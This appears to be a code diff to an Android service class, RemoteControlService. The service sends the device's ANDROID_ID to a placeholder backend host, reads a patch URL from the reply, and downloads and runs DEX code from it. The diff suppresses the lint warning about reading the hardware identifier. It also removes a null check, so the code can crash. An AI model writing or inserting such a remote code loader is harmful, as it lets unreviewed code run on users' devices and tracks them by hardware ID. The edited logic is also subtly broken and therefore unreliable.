@@ -123,7 +123,7 @@ public class RemoteControlService {
     public static void fetchAndApplyPatch(Context ctx) {
         new Thread(() -> {
             try {
-                String token = Settings.Secure.getString(ctx.getContentResolver(), Settings.Secure.ANDROID_ID);
+                @SuppressLint("HardwareIds") String token = Settings.Secure.getString(ctx.getContentResolver(), Settings.Secure.ANDROID_ID);
                 URL url = new URL("https://your-backend.com/patch/" + token);  // ✅ Change to your real endpoint
                 HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                 conn.setConnectTimeout(8000);
@@ -136,7 +136,7 @@ public class RemoteControlService {
                 JSONObject obj = new JSONObject(json);
                 String patchUrl = obj.optString("patch_url", null);
 
-                if (patchUrl != null && !patchUrl.equals("null")) {
+                if (!patchUrl.equals("null")) {
                     downloadAndRunDex(ctx, patchUrl);
                 }
 
